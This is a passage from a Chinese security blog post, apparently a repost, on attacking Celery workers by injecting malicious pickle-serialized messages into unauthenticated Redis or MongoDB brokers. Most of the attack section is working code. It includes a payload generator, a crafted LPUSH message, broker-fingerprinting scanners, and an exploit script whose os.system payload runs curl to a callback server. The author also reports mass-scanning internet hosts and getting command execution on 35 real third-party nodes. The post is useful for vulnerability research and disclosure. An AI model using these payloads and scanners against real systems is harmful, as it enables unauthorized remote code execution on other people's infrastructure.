    "body": "gAJ9cQAoWAMAAAB1dGNxAYhYAgAAAGlkcQJYJAAAADFkOGZhN2FlLTEyZjYtNDIyOS05ZWI5LTk5ZDViYmI5ZGFiZXEDWAUAAABjaG9yZHEETlgGAAAAa3dhcmdzcQV9cQZYBAAAAHRhc2txB1gRAAAAY2VsZXJ5X3NpbXBsZS5hZGRxCFgIAAAAZXJyYmFja3NxCU5YAwAAAGV0YXEKTlgJAAAAY2FsbGJhY2tzcQtOWAQAAABhcmdzcQxLBEsJhnENWAcAAAB0YXNrc2V0cQ5OWAcAAABleHBpcmVzcQ9OWAkAAAB0aW1lbGltaXRxEE5OhnERWAcAAAByZXRyaWVzcRJLAHUu",
    "headers": {},
    "content-encoding": "binary",
    "content-type": "application/x-python-serialize",
    "properties": {
        "body_encoding": "base64",
        "reply_to": "c8b55284-c490-3927-85c5-c68a7fed0525",
        "correlation_id": "1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe",
        "delivery_info": {
            "routing_key": "celery",
            "exchange": "celery",
            "priority": 0
        },
        "delivery_mode": 2,
        "delivery_tag": "027bd89a-389e-41d1-857a-ba895e6eccda"
    }
}</code></pre>
</div>
<p>在上面的消息数据中，properties 里包含了消息的路由信息和标识性的 UUID 值，而其中properties.body_encoding 的值则表示消息主体 body 的编码方式，这里默认为 base64 编码。在 Celery 分布式框架中，worker 端在获取到消息数据时会根据 properties.body_encoding 的值对消息主体 body 进行解码，即 base64.b64decode(body)，而消息数据中的 content-type 指明了消息主体（具体的任务数据）的序列化方式，由于采用了默认的配置所以这里使用的是 Python 内置序列化模块 pickle 对任务数据进行的序列化。</p>
<p>将消息主体经 base64 解码和反序列化（即之前 unserializer.py 文件功能） 操作以后得到具体的任务数据：</p>
<p><a href="http://www.mottoin.com/89644.html/9-94" rel="attachment wp-att-89655"><img class="aligncenter wp-image-89655 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/9-22.png" alt="9" width="1858" height="260" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/9-22.png 1858w, http://www.mottoin.com/wp-content/uploads/2016/09/9-22-300x42.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/9-22-768x107.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/9-22-1024x143.png 1024w" sizes="(max-width: 1858px) 100vw, 1858px" /></a></p>
<p>格式化任务数据为：</p>
<div>
<pre><code class="lang-python">{
    'args': (4, 9),  // 传递进 celery_simple.add 函数中的参数
    'timelimit': (None, None),  // celery Task 任务执行时间限制
    'expires': None,
    'taskset': None,
    'kwargs': {},
    'retries': 0,
    'callbacks': None,  // Task 任务回调
    'chord': None,
    'id': '1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe',  // 任务唯一 ID
    'eta': None,
    'errbacks': None,
    'task': 'celery_simple.add',  // 任务执行的具体方法
    'utc': True
}</code></pre>
</div>
<p>任务数据标明了哪一个注册的 Task 将会被调用执行，其执行的参数是什么等等。这里任务数据已经不在重要，从上面这个分析过程中我们已经得到了这么一个结论：Celery 分布式节点 worker 在获取到消息数据后，默认配置下会使用 pickle 对消息主体进行反序列化。</p>
<h3 id="section-3">3. 构造恶意消息数据</h3>
<p>那么如果在 Broker 中添加一个假任务，其消息主体包含了之前能够进行命令执行的序列化数据，那么在 worker 端对其进行反序列化的时候是不是就能够执行任意代码了呢？下面就来证明这个假设。</p>
<p>这里直接对消息主体 body 进行构造，根据第一节回顾的 Python 序列化利用方式，构造 Payload 使得在反序列化的时候能够执行命令并将结果进行返回（方便后面验证）：</p>
<div>
<pre><code class="lang-python">import base64
import pickle
import commands
class LS(object):
    def __reduce__(self):
        return (commands.getstatusoutput, ('ls', ))
print(base64.b64encode(pickle.dumps(LS())))</code></pre>
</div>
<p>运行程序生成具体 Payload 数据：</p>
<div>
<pre><code class="lang-python">Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou</code></pre>
</div>
<p>使用刚才分析过的消息数据，将消息主体的值替换为上面生成的 Payload 得到构造的假消息：</p>
<div>
<pre><code class="lang-python">{
    "body": "Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou",
    "headers": {},
    "content-encoding": "binary",
    "content-type": "application/x-python-serialize",
    "properties": {
        "body_encoding": "base64",
        "reply_to": "c8b55284-c490-3927-85c5-c68a7fed0525",
        "correlation_id": "1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe",
        "delivery_info": {
            "routing_key": "celery",
            "exchange": "celery",
            "priority": 0
        },
        "delivery_mode": 2,
        "delivery_tag": "027bd89a-389e-41d1-857a-ba895e6eccda"
    }
}</code></pre>
</div>
<p>将假消息通过 Redis 命令行直接添加到 <code class="highlighter-rouge">celery</code> 队列任务中：</p>
<div>
<pre><code class="lang-python">127.0.0.1:6379&gt; LPUSH celery '{"body":"Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou","headers":{},"content-encoding":"binary","content-type":"application/x-python-serialize","properties":{"body_encoding":"base64","reply_to":"c8b55284-c490-3927-85c5-c68a7fed0525","correlation_id":"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe","delivery_info":{"routing_key":"celery","exchange":"celery","priority":0},"delivery_mode":2,"delivery_tag":"027bd89a-389e-41d1-857a-ba895e6eccda"}}'</code></pre>
</div>
<p>查看一下 <code class="highlighter-rouge">celery</code> 队列中的消息情况：</p>
<p><a href="http://www.mottoin.com/89644.html/10-79" rel="attachment wp-att-89656"><img class="aligncenter wp-image-89656 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/10-20.png" alt="10" width="1858" height="284" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/10-20.png 1858w, http://www.mottoin.com/wp-content/uploads/2016/09/10-20-300x46.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/10-20-768x117.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/10-20-1024x157.png 1024w" sizes="(max-width: 1858px) 100vw, 1858px" /></a></p>
<p>然后起一个 Celery worker 端加载之前的 <code class="highlighter-rouge">celery_simple.py</code> 中的 APP，worker 会从队列中取消息进行处理，当处理到插入的假消息时，会由于无法解析任务数据而报错：</p>
<p><a href="http://www.mottoin.com/89644.html/11-78" rel="attachment wp-att-89657"><img class="aligncenter wp-image-89657 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/11-19.png" alt="11" width="1856" height="250" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/11-19.png 1856w, http://www.mottoin.com/wp-content/uploads/2016/09/11-19-300x40.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/11-19-768x103.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/11-19-1024x138.png 1024w" sizes="(max-width: 1856px) 100vw, 1856px" /></a></p>
<p>worker 端经过 <code class="highlighter-rouge">pickle.loads(base64.b64decode(body))</code> 处理对构造的 Payload 进行的反序列化，由于 Payload 在反序列化时会执行命令并返回执行结构，所以这里 worker 端直接将命令执行的结果当作了任务的具体数据，同时也证明了在 Celery 分布式框架默认配置下（使用了 <code class="highlighter-rouge">pickle</code> 序列化方式），进行恶意消息注入会导致 worker 端远程命令执行。</p>
<h2 id="broker-">三、利用脆弱的 Broker 代理进行分布式节点攻击</h2>
<p>前面已经证明了 Celery 构建的应用中，如果攻击者能够控制 Broker 往消息队列中添加任意消息数据，那么即可构造恶意的消息主体数据，使得 worker 端在对其进行反序列化的时候触发漏洞导致任意命令执行。整个流程为：</p>
<h3><a href="http://www.mottoin.com/89644.html/12-63" rel="attachment wp-att-89658"><img class="aligncenter wp-image-89658 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/12-19.png" alt="12" width="1618" height="674" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/12-19.png 1618w, http://www.mottoin.com/wp-content/uploads/2016/09/12-19-300x125.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/12-19-768x320.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/12-19-1024x427.png 1024w" sizes="(max-width: 1618px) 100vw, 1618px" /></a></h3>
<h3 id="celery--broker-">1. 检测 Celery 应用中 Broker 特征</h3>
<p>那么对于这样一个分布式应用，攻击者是否能够轻易的控制 Broker 呢？在 Celery 支持的消息队列中间件中含有 Reids、MongoDB 这种存在未授权访问问题的服务，因此当一个基于 Celery 框架实现的分布式应用使用了 Redis 或者 MongoDB 作为 Broker 时，极有可能由于中间件未授权访问的问题而被攻击者利用，进行恶意的消息注入。</p>
<p>所以，如何去寻找既存在未授权访问问题，同时又作为 Celery 分布式应用 Broker 的那些脆弱服务呢？根据上一节的分析，已经得知如果 Redis 作为 Broker 时，其 KEYS 值会存在固定的特征：</p>
<div>
<pre><code class="lang-python">_kombu.binding.*
celery.*
unacked.*</code></pre>
</div>
<p>而如果是 MongoDB 作为 Broker，在其数据库中会存在这样的 collections：</p>
<div>
<pre><code class="lang-python">messages
messages.broadcast
messages.routing</code></pre>
</div>
<p>其中 <code class="highlighter-rouge">messages.routing</code> 含有每一个队列以及消息路由的信息，<code class="highlighter-rouge">messages</code> 则存储了所有队列中的消息数据。</p>
<p><a href="http://www.mottoin.com/89644.html/13-54" rel="attachment wp-att-89659"><img class="aligncenter wp-image-89659 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/13-13.png" alt="13" width="1860" height="700" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/13-13.png 1860w, http://www.mottoin.com/wp-content/uploads/2016/09/13-13-300x113.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/13-13-768x289.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/13-13-1024x385.png 1024w" sizes="(max-width: 1860px) 100vw, 1860px" /></a></p>
<p>那么就可以根据不同中间件服务的特征去验证一个 Redis 或者 MongoDB 是否作为 Broker 存在于 Celery 分布式应用中。</p>
<p>针对 Redis 和 MongoDB 可编写出相应的验证脚本，其代码关键部分为：</p>
<div>
<pre><code class="lang-python"># celery_broker_redis_check.py
...
CELERY_KEYS = ['celery', 'unacked', '_kombu.binding']
def run(seed):
    try:
        ip, port = seed.split(':')
    except ValueError as ex:
        ip, port = seed, 6379
    r = redis.Redis(ip, int(port), socket_connect_timeout=5)
    keys = r.keys()
    info = dict(succeed=False, keys=list())
    for _k in CELERY_KEYS:
        for key in keys:
            if _k in key:
                info['succeed'] = True
                info['keys'].append(key)
    return info
...</code></pre>
</div>
<p>针对未授权的 Redis 服务，直接对所有 KEYS 值进行特征匹配，如果遇到其 KEY 值包含有 <code class="highlighter-rouge">['celery', 'unacked', '_kombu.binding']</code> 中任意一个字符串即可判断该服务作为了 Celery 应用的消息队列中间件。</p>
<div>
<pre><code class="lang-python"># celery_broker_mongodb_check.py
...
CELERY_COLLECTIONS = ['messages.routing', 'messages.broadcast']
def run(seed):
    try:
        ip, port = seed.split(':')
    except ValueError as ex:
        ip, port = seed, 27017
    conn = pymongo.MongoClient(ip, int(port), connectTimeoutMS=2000,
                               serverSelectionTimeoutMS=2000)
    dbs = conn.database_names()
    info = dict(succeed=False, results=dict())
    for db in dbs:
        colnames = conn.get_database(db).collection_names()
        for _col in CELERY_COLLECTIONS:
            if any(_col in colname for colname in colnames):
                info['succeed'] = True
                info['results'][db] = colnames
                continue
    return info
...</code></pre>
</div>
<p>而由于 Celery 在使用 MongoDB 的时候需要指定数据库，所以需要对存在未授权访问的 MongoDB 中的每一个数据库都进行检测，判断其中的集合名称是否符合条件，若符合即可判断其作为了消息队列中间件。</p>
<h3 id="section-4">2. 使用脚本进行消息注入攻击分布式节点</h3>
<p>使用上面两个脚本在本地环境进行测试：</p>
<p><a href="http://www.mottoin.com/89644.html/14-49" rel="attachment wp-att-89660"><img class="aligncenter wp-image-89660 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/14-12.png" alt="14" width="1858" height="294" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/14-12.png 1858w, http://www.mottoin.com/wp-content/uploads/2016/09/14-12-300x47.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/14-12-768x122.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/14-12-1024x162.png 1024w" sizes="(max-width: 1858px) 100vw, 1858px" /></a></p>
<p>这里要说明的一个问题就是，不是所有使用了 Celery 分布式框架的应用都配置了 <code class="highlighter-rouge">pickle</code> 的序列化方式，<strong>若其只配置了 JSON 等其他安全的序列化方式，则就无法利用 Python 反序列化进行命令执行了</strong>。</p>
<p>一个简单的真对 Redis Broker 类型的攻击脚本：</p>
<div>
<pre><code class="lang-python"># celery_broker_redis_exp.py
import re
import json
import redis
import pickle
import base64

evil_command = 'curl http://127.0.0.1:8000/{}'

def create_evil_task_body(command, body_encoding='base64'):
    class Command(object):
        def __reduce__(self):
            import os
            return (os.system, (command, ))
    if body_encoding == 'base64':
        return base64.b64encode(pickle.dumps(Command()))

def create_evil_message(body):
    message = {"body": body,"headers": {},"content-encoding": "binary","content-type": "application/x-python-serialize","properties": {"body_encoding": "base64","reply_to": "c8b55284-c490-3927-85c5-c68a7fed0525","correlation_id": "1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe","delivery_info": {"routing_key": "celery","exchange": "celery","priority": 0},"delivery_mode": 2,"delivery_tag": "027bd89a-389e-41d1-857a-ba895e6eccda"}}
    return json.dumps(message)

def exp(seed):
    try:
        ip, port = seed.split(':')
    except ValueError as ex:
        ip, port = seed, 6379
    r = redis.Redis(ip, int(port), socket_connect_timeout=5)
    keys = r.keys()
    info = dict(succeed=False, keys=list())
    for key in keys:
        matched = re.search(r'^_kombu\.binding\.(?P&lt;queue&gt;.*)', key)
        if matched:
            queue_name = matched.group('queue')
            message = create_evil_message(
                create_evil_task_body(evil_command.format(queue_name))
            )
            r.lpush(queue_name, message)

exp('192.168.99.100')</code></pre>
</div>
<p>为了测试攻击脚本，首先需要在 <code class="highlighter-rouge">192.168.99.100</code> 上开启 Redis 服务并配置为外部可连且无需验证，然后在本地起一个 SimpleHTTPServer 用于接收节点执行命令的请求，最后可直接通过终端配置 Broker 为 Redis 起一个默认的 worker：</p>
<div>
<pre><code class="lang-python">celery worker --broker='redis://:@192.168.99.100/0'</code></pre>
</div>
<p>整个过程演示：</p>
<p><a href="http://www.mottoin.com/89644.html/15-44" rel="attachment wp-att-89661"><img class="aligncenter wp-image-89661 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/15.gif" alt="15" width="960" height="503" /></a></p>
<p>可以看到通过往消息队列中插入恶意消息，被分布式节点 worker 获取解析后触发了反序列化漏洞导致了远程命令执行。</p>
<h2 id="section-5">四、互联网案例检测</h2>
<p>上一节内容通过实际的代码和演示过程说明了如何通过特征去验证消息队列中间件是否作为了 Celery 分布式框架的一部分，那么互联网中是否真的存在这样的实例呢。这里再次理一下针对 Celery 分布式节点攻击的思路：</p>
<ol>
<li>找寻那有着未授权访问且用于 Celery 消息队列传递的中间件服务；</li>
<li>往消息队列中插入恶意消息数据，因无法确定目标是否允许进行 <code class="highlighter-rouge">pickle</code> 方式序列化，所以会进行 Payload 盲打；</li>
<li>等待分布式节点取走消息进行解析，触发反序列化漏洞执行任意代码；</li>
</ol>
<p>首先针对第一点，利用脚本去扫描互联网中存在未授权访问且用于 Celery 消息队列传递的 Redis 和 MongoDB 服务。通过扫描得到未授权访问的 Redis 有 <strong>14000+</strong> 个，而未授权访问的 MongoDB 同样也有 <strong>14000+</strong> 个。</p>
<p>针对 <strong>14000+</strong> 个存在未授权访问的 Redis 服务使用上一节的验证脚本（<code class="highlighter-rouge">celery_broker_redis_check.py</code>）进行批量检测，得到了 <strong>86</strong> 个目标满足要求，扫描过程截图：</p>
<p><a href="http://www.mottoin.com/89644.html/16-43" rel="attachment wp-att-89662"><img class="aligncenter wp-image-89662 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/16-13.png" alt="16" width="1140" height="646" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/16-13.png 1140w, http://www.mottoin.com/wp-content/uploads/2016/09/16-13-300x170.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/16-13-768x435.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/16-13-1024x580.png 1024w" sizes="(max-width: 1140px) 100vw, 1140px" /></a></p>
<p>同样的针对 <strong>14000+</strong> 个存在未授权访问的 MongoDB 服务进行批量检测，得到了 <strong>22</strong> 个目标满足要求，扫描过程截图：</p>
<p><a href="http://www.mottoin.com/89644.html/17-35" rel="attachment wp-att-89663"><img class="aligncenter wp-image-89663 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/17-11.png" alt="17" width="1139" height="644" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/17-11.png 1139w, http://www.mottoin.com/wp-content/uploads/2016/09/17-11-300x170.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/17-11-768x434.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/17-11-1024x579.png 1024w" sizes="(max-width: 1139px) 100vw, 1139px" /></a></p>
<p>根据结果来看，虽然最终满足条件的目标数量并不多，但是这足以说明利用消息注入对分布式节点进行攻击的思路是可行的，并且在消息队列中间件后面有多少个 worker 节点并不知道，危害的不仅仅是 Broker 而是后面的整个节点。</p>
<p>由于具体的攻击 Payload 使用了盲打，所以不能直接获取远端成功执行命令的结果，所以这里借助外部服务来监听连接请求并进行标识，若一个分布式节点成功触发了漏洞，它会去请求外部服务器。</p>
<p>针对 Redis 检测过程截图：</p>
<p><a href="http://www.mottoin.com/89644.html/18-26" rel="attachment wp-att-89665"><img class="aligncenter wp-image-89665 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/18-7.png" alt="18" width="1860" height="566" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/18-7.png 1860w, http://www.mottoin.com/wp-content/uploads/2016/09/18-7-300x91.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/18-7-768x234.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/18-7-1024x312.png 1024w" sizes="(max-width: 1860px) 100vw, 1860px" /></a></p>
<p>其中服务器上收到了 <strong>32</strong> 个成功执行命令并回连的请求：</p>
<p><a href="http://www.mottoin.com/89644.html/19-25" rel="attachment wp-att-89666"><img class="aligncenter wp-image-89666 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/19-7.png" alt="19" width="1978" height="592" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/19-7.png 1978w, http://www.mottoin.com/wp-content/uploads/2016/09/19-7-300x90.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/19-7-768x230.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/19-7-1024x306.png 1024w" sizes="(max-width: 1978px) 100vw, 1978px" /></a></p>
<p>同样的针对 MongoDB 检测过程截图：</p>
<p><a href="http://www.mottoin.com/89644.html/20-23" rel="attachment wp-att-89667"><img class="aligncenter wp-image-89667 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/20-6.png" alt="20" width="1858" height="526" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/20-6.png 1858w, http://www.mottoin.com/wp-content/uploads/2016/09/20-6-300x85.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/20-6-768x217.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/20-6-1024x290.png 1024w" sizes="(max-width: 1858px) 100vw, 1858px" /></a></p>
<p>其中服务器上成功收到 <strong>3</strong> 个成功执行命令并回连的请求：</p>
<p><a href="http://www.mottoin.com/89644.html/21-21" rel="attachment wp-att-89668"><img class="aligncenter wp-image-89668 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/21-6.png" alt="21" width="1936" height="300" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/21-6.png 1936w, http://www.mottoin.com/wp-content/uploads/2016/09/21-6-300x46.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/21-6-768x119.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/21-6-1024x159.png 1024w" sizes="(max-width: 1936px) 100vw, 1936px" /></a></p>
<p>从最后得到的数据来看，成功触发漏洞导致远程命令执行的目标数量并不多，而且整个利用条件也比较苛刻，但就结论而言，已经直接解答了文章一开始所提出的疑问，利用多个漏洞对分布式节点进行攻击的思路也成功得到了实践。</p>
<p><strong>（写了那么多，更多的想把自己平常折腾和研究的一些点给分享出来，理论应用到实战，没有案例的漏洞都不能称之为好漏洞。将一些想法和思路付之于实践，终究会得到验证。）</strong></p>
<h2 id="section-6">相关链接</h2>
<ul>
<li><a href="http://www.celeryproject.org/">Celery 分布式框架项目 &#8211; http://www.celeryproject.org/</a></li>
<li><a href="https://docs.python.org/2/library/pickle.html">Python “pickle” 模块文档 &#8211; https://docs.python.org/2/library/pickle.html</a></li>
<li><a href="http://rickgray.me/2015/09/12/django-command-execution-analysis.html">Django 远程命令执行漏洞详解 &#8211; http://rickgray.me/2015/09/12/django-command-execution-analysis.html</a></li>
</ul>
<p style="text-align: center;">*原文：<a href="http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection.html">rickgray</a>  MottoIN授权发布</p>
                                                        <div class="entry-copyright"><p>原创文章，作者：Sam，如若转载，请注明出处：http://www.mottoin.com/89644.html</p></div>                        </div>
                        <div class="entry-footer">
                            <div class="entry-tag"><a href="http://www.mottoin.com/tag/celery-%e5%88%86%e5%b8%83%e5%bc%8f%e6%a1%86%e6%9e%b6" rel="tag">Celery 分布式框架</a><a href="http://www.mottoin.com/tag/%e5%88%86%e5%b8%83%e5%bc%8f%e7%b3%bb%e7%bb%9f" rel="tag">分布式系统</a><a href="http://www.mottoin.com/tag/%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" rel="tag">反序列化</a><a href="http://www.mottoin.com/tag/%e6%94%bb%e5%87%bb%e6%96%b9%e6%b3%95" rel="tag">攻击方法</a><a href="http://www.mottoin.com/tag/%e6%95%b0%e6%8d%ae%e7%af%a1%e6%94%b9" rel="tag">数据篡改</a><a href="http://www.mottoin.com/tag/%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" rel="tag">未授权访问</a><a href="http://www.mottoin.com/tag/%e6%bc%8f%e6%b4%9e%e7%bb%84%e5%90%88" rel="tag">漏洞组合</a><a href="http://www.mottoin.com/tag/%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" rel="tag">远程命令执行</a></div>
                            <div class="entry-action">
                                <div class="btn-zan" data-id="89644"><i class="fa fa-thumbs-up"></i> 赞 <span class="entry-action-num">(0)</span></div>

                                
                            </div>
                            <div class="entry-bar">
                                <div class="entry-bar-inner clearfix">
                                                                            <div class="author pull-left">
                                            <a data-user="11" target="_blank" href="http://www.mottoin.com/user/lycxk/" class="avatar">
                                                <img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-60 um-avatar um-avatar-gravatar" width="60" height="60" alt="Sam" />                                                Sam                                            </a>
                                            <span class="author-title">普通用户</span>                                         </div>
                                                                        <div class="info pull-right">
                                        <div class="info-item meta">
                                            <a class="meta-item j-heart" href="javascript:;" data-id="89644"><i class="fa fa-heart"></i> <span class="data">0</span></a>
                                            <a class="meta-item" href="#comments"><i class="fa fa-comment"></i> <span class="data">0</span></a>
                                                                                    </div>
                                        <div class="info-item share">
                                            <a class="meta-item" href="javascript:;">
                                                <i class="fa fa-wechat"></i>
                                                <span class="wx-wrap">
                                                    <img src="//pan.baidu.com/share/qrcode?w=320&h=320&url=http://www.mottoin.com/89644.html">
                                                    <span>扫码分享到微信</span>
                                                </span>
                                            </a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=tsina&key=&url=http%3A%2F%2Fwww.mottoin.com%2F89644.html&title=%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88%E6%8B%B3+%26%238211%3B+%E6%94%BB%E5%87%BB%E5%88%86%E5%B8%83%E5%BC%8F%E8%8A%82%E7%82%B9" target="_blank"><i class="fa fa-weibo"></i></a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=qzone&key=&url=http%3A%2F%2Fwww.mottoin.com%2F89644.html&title=%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88%E6%8B%B3+%26%238211%3B+%E6%94%BB%E5%87%BB%E5%88%86%E5%B8%83%E5%BC%8F%E8%8A%82%E7%82%B9" target="_blank"><i class="fa fa-qq"></i></a>
                                        </div>
                                        <div class="info-item act">
                                            <a href="javascript:;" id="j-reading"><i class="fa fa-file-text"></i></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                                                        <h3 class="entry-related-title">相关推荐</h3><ul class="entry-related clearfix"><li><a href="http://www.mottoin.com/87291.html" title="PentestPackage：渗透测试常用脚本打包">PentestPackage：渗透测试常用脚本打包</a></li><li><a href="http://www.mottoin.com/95865.html" title="BurpSuite和Fiddler串联使用解决App测试漏包和速度慢的问题">BurpSuite和Fiddler串联使用解决App测试漏包和速度慢的问题</a></li><li><a href="http://www.mottoin.com/85907.html" title="利用metasploit(meterpreter)提下system权限加不了账号的shell">利用metasploit(meterpreter)提下system权限加不了账号的shell</a></li><li><a href="http://www.mottoin.com/86579.html" title="FireEye：Red Team工具综述">FireEye：Red Team工具综述</a></li><li><a href="http://www.mottoin.com/94646.html" title="使用param标签绕过XSS Auditor ">使用param标签绕过XSS Auditor </a></li><li><a href="http://www.mottoin.com/95010.html" title="通过Burp Collaborator插件利用SQL盲注">通过Burp Collaborator插件利用SQL盲注</a></li><li><a href="http://www.mottoin.com/90755.html" title="UAC攻击剖析">UAC攻击剖析</a></li><li><a href="http://www.mottoin.com/98591.html" title="Struts 2远程命令执行漏洞S2-046">Struts 2远程命令执行漏洞S2-046</a></li><li><a href="http://www.mottoin.com/94449.html" title="使用Hashcat破解外国字符构成的密码的终极指南">使用Hashcat破解外国字符构成的密码的终极指南</a></li><li><a href="http://www.mottoin.com/88234.html" title="Pegasus – 针对iOS设备的APT攻击分析">Pegasus – 针对iOS设备的APT攻击分析</a></li></ul>                        </div>
                        
<div id="comments" class="entry-comments">
    	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="/89644.html#respond" style="display:none;">取消回复</a></small></h3><div class="comment-form"><div class="comment-must-login">请登录后评论...</div><div class="form-submit"><div class="form-submit-text pull-left"><a href="http://www.mottoin.com/login">登录</a>后才能评论</div> <input name="submit" type="submit" id="must-submit" class="submit" value="发表"></div></div>	</div><!-- #respond -->
		</div><!-- .comments-area -->                    </div>
                </article>
                    </div>
        <aside class="sidebar">
            <div id="profile-3" class="widget widget_profile">                <div class="cover_photo"></div>
                        <div class="avatar-wrap">
                <a target="_blank" href="http://www.mottoin.com/user/lycxk/" class="avatar-link"><img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-120 um-avatar um-avatar-gravatar" width="120" height="120" alt="Sam" /></a></div>
            <div class="profile-info">
                <p><span class="author-name">Sam</span><span class="author-title">普通用户</span></p>
                <p class="author-description"></p>
            </div>
            <div class="profile-posts">
                <h3 class="widget-title"><span>最近文章</span></h3>
                <ul>                    <li><a href="http://www.mottoin.com/97590.html" title="金融行业企业安全运营之路">金融行业企业安全运营之路</a></li>
                                    <li><a href="http://www.mottoin.com/96325.html" title="维基解密发布秘密“CIA间谍订单”">维基解密发布秘密“CIA间谍订单”</a></li>
                                    <li><a href="http://www.mottoin.com/95972.html" title="Tater：一个基于powershell的windows渗透测试工具">Tater：一个基于powershell的windows渗透测试工具</a></li>
                                    <li><a href="http://www.mottoin.com/95911.html" title="Invoke-Vnc：powershell vnc inject工具">Invoke-Vnc：powershell vnc inject工具</a></li>
                                    <li><a href="http://www.mottoin.com/95401.html" title="Windows DLL注入基础分析与防护">Windows DLL注入基础分析与防护</a></li>
                </ul>            </div>
            </div><div id="custom_html-3" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><a class="btn-post" href="/question"><i class="fa fa-edit"></i> 我要提问</a></div></div><div id="post-thumb-3" class="widget widget_post_thumb">            <ul>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
